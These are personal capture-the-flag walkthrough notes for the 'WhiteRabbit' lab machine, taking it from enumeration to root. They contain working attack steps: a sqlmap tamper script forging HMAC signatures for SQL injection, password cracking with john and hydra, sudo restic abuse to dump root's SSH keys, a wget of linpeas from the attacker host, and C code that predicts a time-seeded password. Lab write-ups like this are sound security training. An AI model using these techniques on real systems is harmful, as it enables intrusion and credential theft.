# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.63
nmap -sU --top-ports=10 -vv 10.10.

--OUTPUT---
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBslomQGZRF6FPNyXmI7hlh/VDhJq7Px0dkYQH82ajAIggOeo6mByCJMZTpOvQhTxV2QoyuqeKx9j9fLGGwkpzk=
|   256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoXISApIRdMc65Kw96EahK0EiPZS4KADTbKKkjXSI3b
80/tcp   open  http    syn-ack ttl 62 Caddy httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://whiterabbit.htb
|_http-server-header: Caddy
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKu1+ymf1qRT1c7pGig7JS8MrnSTvbycjrPWQfRLo/DM73E24UyLUgACgHoBsen8ofEO+R9dykVEH34JOT5qfgQ=
|   256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTObILLdRa6Jfr0dKl3LqWod4MXEhPnadfr+xGSWTQ+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

-----
PORT     STATE         SERVICE
53/udp   open|filtered domain
67/udp   open|filtered dhcps

```

## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://whiterabbit.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---

```
		- Next Directory
			```bash

```
	- VHost
		```bash

```
- Ffuf
	```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://whiterabbit.htb/ -H 'Host: FUZZ.whiterabbit.htb' -fw 1

---OUTPUT---
status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 51ms]
```
	- add to /etc/hosts
- Dirsearch
	```bash
[06:26:07] Starting:                                                                                   
[06:26:24] 301 -  179B  - /assets  ->  /assets/                             
[06:26:32] 200 -   15KB - /favicon.ico                                      
[06:26:38] 200 -  415B  - /manifest.json                                    
[06:26:39] 401 -    0B  - /metrics/                                         
[06:26:39] 401 -    0B  - /metrics                                          
[06:26:46] 200 -   25B  - /robots.txt                                       
[06:26:47] 301 -  189B  - /screenshots  ->  /screenshots/                   
[06:26:50] 404 -    2KB - /status                                           
[06:26:50] 404 -    2KB - /status/
[06:26:50] 404 -    2KB - /status?full=true                                 
[06:26:53] 404 -   15B  - /upload/                                          
[06:26:53] 301 -  179B  - /Upload  ->  /Upload/                             
[06:26:53] 301 -  179B  - /upload  ->  /upload/                             
[06:26:53] 404 -   15B  - /upload/2.php
[06:26:53] 404 -   15B  - /upload/b_user.xls                                
[06:26:53] 404 -   15B  - /upload/1.php
[06:26:53] 404 -   15B  - /upload/loginIxje.php
[06:26:53] 404 -   15B  - /upload/b_user.csv                                
[06:26:53] 404 -   15B  - /upload/test.php
[06:26:53] 404 -   15B  - /upload/upload.php
[06:26:53] 404 -   15B  - /upload/test.txt
```
	- response size of status is different from the rest even though 404
- Gobuster on status:
	```bash
gobuster dir -u http://status.whiterabbit.htb/status/ dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root              
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb/status/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/temp                 (Status: 200) [Size: 3359]
```
	- Leads to a website which shows more sites that i add to /etc/hosts
		![[Pasted image 20250412064314.png]]
		- http://ddb09a8558c9.whiterabbit.htb/login
			- Login page
		- http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
			- holds another website in the screenshot
			- Explains how the signature is created :
				- Extract Signature: The signature from the header is extracted.  
				- Calculate Signature: The workflow recalculates the expected signature based on the received data and the secret key.  
				- Compare Signature: The calculated signature is then compared against the received signature to confirm authenticity.
			- States:
				```bash
We have attached a json file of a completed workflow where an invalid signature is provided  
[gophish_to_phishing_score_database.json](http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json)

-----
This HMAC (Hash-Based Message Authentication Code) signature is generated by hashing the body of the request along with a secret key
```
				- We search for the file and search the word "hmac" to find the secret key:
					```bash
   {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
```
					- we also see how it's creating the key, stringifys the header content for json format. (This basically removes all spaces, new lines etc)
						- on google json.stringify we see it removes all spaces
							- we test this with the content in the picture here to get the signature to match it:
								https://www.devglan.com/online-tools/hmac-sha256-online
								![[Pasted image 20250412152116.png]]
							- it matches.
				- We also see an example packet which we use to check how the encryption works with the signature. we use that packet and save it as a file. (we also replace the email field with * for sqlmap to identify where. and add a tamper script to deal with the signature for each entry)
					- tamper script:
						```python
import hmac
import hashlib

secret_key = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'

def tamper(payload, **kwargs):
    # Escape quotes in the payload to maintain valid JSON structure
    escaped_payload = payload.replace('"', '\\"')
    
    # Construct the message dynamically with the escaped payload
    message = f'{{"campaign_id":1,"email":"{escaped_payload}","message":"Clicked Link"}}'.encode('utf-8')

    # Generate the HMAC using the secret key and SHA256
    hmac_object = hmac.new(secret_key, message, hashlib.sha256)
    hmac_result = hmac_object.hexdigest()
    hmac_payload = "sha256=" + hmac_result

    # Modify the headers to include the generated HMAC signature
    headers = kwargs.get("headers", {})
    headers["x-gophish-signature"] = hmac_payload

    # Return the payload (the injected payload stays intact, only the header is modified)
    return payload
```
						- sql.req
							```bash
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "*",
  "message": "Clicked Link"
}
```
						- sqlmap command:
							```bash
sqlmap -r sql.test --dbms mysql --batch --tamper=sqlmap.py --level=5 --risk=3 --flush-session --dbs --threads=10
sqlmap -r sql.test --dbms mysql --batch --tamper=sqlmap.py --level=5 --risk=3 --flush-session --D temp --tables --threads=10
sqlmap -r sql.test --dbms mysql --batch --tamper=sqlmap.py --level=5 --risk=3 --flush-session -D temp -T command_log --dump  --threads=10

---OUTPUT-FINAL---
Database: temp
Table: command_log
[6 entries]
+------+---------------------+------------------------------------------------------------------------------+
| id   | date                | command                                                                      |
+------+---------------------+------------------------------------------------------------------------------+
| 1    | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2    | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
|      | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4    | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5    | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6    | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+------+---------------------+------------------------------------------------------------------------------+

```
							- Three main takeaways:
								- credential
								- neo-password-generator
								- time stamp of neo-password-generator being used*
		- http://28efa8f7df.whiterabbit.htb/signin?redirect=%252F
			- n8n login
- We see restic is being used to create a repository
	- Another IP we add to /etc/hosts
	- Password for the repository is there.
- We download restic with apt install
	- restore database
		```bash
restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --target .
> Enter password

--OR--
restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --password-command "echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw" --target .

---OUTPUT---
repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to .
Summary: Restored 4 files/dirs (0 B) in 0:00, skipped 1 files/dirs 572 B
```
	- We move into /dev/shm/bob/ssh/ folder and try to unzip the file
		```bash
7z x bob.7z
```
		- John has a 7z cracking toop
			```bash
7z2john bob.7z

---OUTPUT---
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```
		- We attempt to crack it:
			```bash
john bob.hash --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 --format=7z

---OUTPUT---
1q2w3e4r5t6y
```
	- We unzip the file with the password
		```bash
7z x bob.7z
>1q2w3e4r5t6y
```
		- We get private and public key of bob
			- We change permissions to 0600 and try to ssh into bob. It fails the first time but we remember theres another ssh port open and it works on that port and we gain access as bob
				```bash
chmod 0600 bob
chmod 0600 bob.pub
ssh -i bob bob@whiterabbit.htb
ssh -i bob@whiterabbit.htb -p 2222
```
	- But no user flag.
	- 172.17.0.2
## Lateral Movement
- We do some enumeration :
	```bash
cat /etc/passwd | grep "sh"
sudo -l

---OUTPUT-1---
root:x:0:0:root:/root:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1001:1001::/home/bob:/bin/bash

---OUTPUT-2---
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic

```
	- on checking restic commands we can try to initialise a new repository and restore contants from another file onto it..like say the root folder as e can run it as root :
		```bash
mkdir rocknrj
sudo restic -r rocknrj/ init # set a password
sudo restic -r /home/bob/rocknrj backup /root
sudo restic -r rocknrj/ ls latest

---OUTPUT---
enter password for repository: 
repository 9e925376 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot 3c017e62 of [/root] filtered by [] at 2025-04-12 21:43:20.356293095 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```
		- We want these ssh files of morpheus.
			```bash
sudo restic -r rocknrj/ dump latest /root/morpheus > rocknrj/morpheus
sudo restic -r rocknrj/ dump latest /root/morpheus.pub > rocknrj/morpheus.pub
```
	- We ssh into morpheus (can only do it via bob) after setting the right permissions on these files:
		```bash
chmod 0600 morpheus
chmod 0600 morpheus.pub
ssh -i morpheus morpheus@10.10.11.63
```
		- We get user flag
## Privilege Escalation (Insaneee)
- we do some enumeration :
	```bash
sudo -l (but we dont have pwd)
cat /etc/passwd | grep "sh"
find / -type f -perm -4000 2>/dev/null
```
- We grab linpeas.sh
	```bash
---LOCAL---
# Have linpeas.sh in current directory
python3 -m http.server 8001

--TARGET--
wget http://10.10.14.25:8001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
- From linpeas.sh or just on normal enumeration we find an executable in opt directory named `neo-password-generator`
	- On executing it, we get a fixed length of random characters
	- We also saw there is a user neo in /etc/passwd
	- we pass `strings` command but don't get much
	- We grab the file to our local machine to analyze further with ghidra:
		```bash
---TARGET-BOB---
scp -i morpheus morpheus@10.10.11.63:/opt/neo-password-generator/neo-password-generator .

---LOCAL---
scp -P 2222 -i bob bob@whiterabbit.htb:/home/bob/rocknrj/neo-password-generator .
neo-password-generator .
```
- We open up Ghidra to analyze it and find two important functions:
	```C

undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
------------------------------

void generate_password(uint param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_34;
  char local_28 [20];
  undefined1 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  srand(param_1);
  for (local_34 = 0; local_34 < 0x14; local_34 = local_34 + 1) {
    iVar1 = rand();
    local_28[local_34] =
         "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[iVar1 % 0x3e];
  }
  local_14 = 0;
  puts(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
	- The main function :
		- gets time of day with gettimeofdayfunction
			- https://man7.org/linux/man-pages/man2/gettimeofday.2.html
				- has tv_sec (seconds) and tv_usec (microseconds)
			- `generate_password()` function is fed these tv_sec and tv_usec inputs of the current time.
				- tv_sec is multiplied by 1000 and tv_usec is divided by 1000
					- so it is checking the time to the millisecond.
				- The function contents:
					- has a character set of 62 characters (a-z, A-Z, 0-9)
					- `for i =0 ; i < 0x14 (i.e 20) ; i++)
						- iVar1 is a random number generated by `srand()` function with the time of day argument in milliseconds.
						- one character from the 62 character set is selected
							- the character is decided by the remainder of `iVar1` and `0x3e` which is 62.
								- This ensures value is between 0 and 61
- So we need to create a code to replicate this as the srand function can only generate so many random bits at a specific millisecond. We can create a c code replicating this with an offset of one second i.e 1000 since we are working in milliseconds to get a list of 1000 passwords to brute force.
	- First we need to find the time neo created his password:
		```bash
---TARGET-MORPHEUS---
stat neo-password-generator

---OUTPUT---
  File: neo-password-generator
  Size: 15656           Blocks: 32         IO Block: 4096   regular file
Device: 252,0   Inode: 137331      Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-04-12 14:41:00.516325608 +0000
Modify: 2024-08-30 14:35:27.089700598 +0000 **
Change: 2024-08-30 14:35:27.089700598 +0000
 Birth: 2024-08-30 14:35:27.089700598 +0000
```
		- `Modify: 2024-08-30 14:35:27.089700598 +0000`
			- August 30, 2024 at 14:35:27.089700598
	- We write our code taking in the offset of one second to gain a list of passwords:
		```C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char generated_password[21];

    // === SET YOUR GUESS HERE ===
    struct tm target_time = {0};
    target_time.tm_year = 2024 - 1900;  // year 2024
    target_time.tm_mon  = 8 - 1;            // August (0-based, so 7 = August)
    target_time.tm_mday = 30;           // day
    target_time.tm_hour = 14;
    target_time.tm_min  = 40;
    target_time.tm_sec  = 42;

    // Convert to epoch time in seconds (UTC)
    time_t base_time = timegm(&target_time);  

    // Brute-force milliseconds in a 1 second window
    for (int offset = 0; offset < 1000; offset++) {  // iterate through millisecond offsets
        srand(base_time * 1000 + offset);  // Correct seeding using milliseconds

        for (int i = 0; i < 20; i++) {
            int r = rand();
            generated_password[i] = charset[r % 62];
        }

        generated_password[20] = '\0';

        // Just print the password
        printf("%s\n", generated_password);
    }

    return 0;
}
```
		- Why do we use time stamp 40 minutes 42 seconds?
			- initially i did stat on the file an it was modified about 5 minutes before yet the brute force didn't work.
			- Then looking back at our MySQL dump, we see that the command to generate the password was done at :
				```bash
| 6    | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
```
- We make it into an executable, execute it and save it to a text file
	```bash
vi pwdlist.c # Copy code here
gcc pwdlist.c -o pwdlist
./pwdlist > pwdlist.txt
```
- We brute force neo with these password credentials using hydra via ssh:
	```bash
hydra -l neo -P pwdlist.txt -t 16 ssh://whiterabbit.htb

---OUTPUT---
[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
```
- We ssh into target with neo's credentials
	```bash
ssh neo@whiterabbit.htb
> WBSxhWgfnMiclrV4dqfj
```
	- We login as neo
- We check sudo privileges :
	```bash
sudo -l

---OUTPUT---
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```
	- We read root.txt
		```bash
sudo cat /root/root.txt

```
## Website Enumeration
- 
### Direct
- status.whiterabbit.htb
	- Uptime Kuma Login

### Via BurpSuite
- 

--------------
## Initial Foothold in Website
- NONE

-----------1
## Privilege Escalation in Website
- NONE

----------
## Initial Foothold in Target

- Bob
----------
## Lateral Movement in Target
- Morpheus
-----------
## Privilege Escalation in Target
- Neo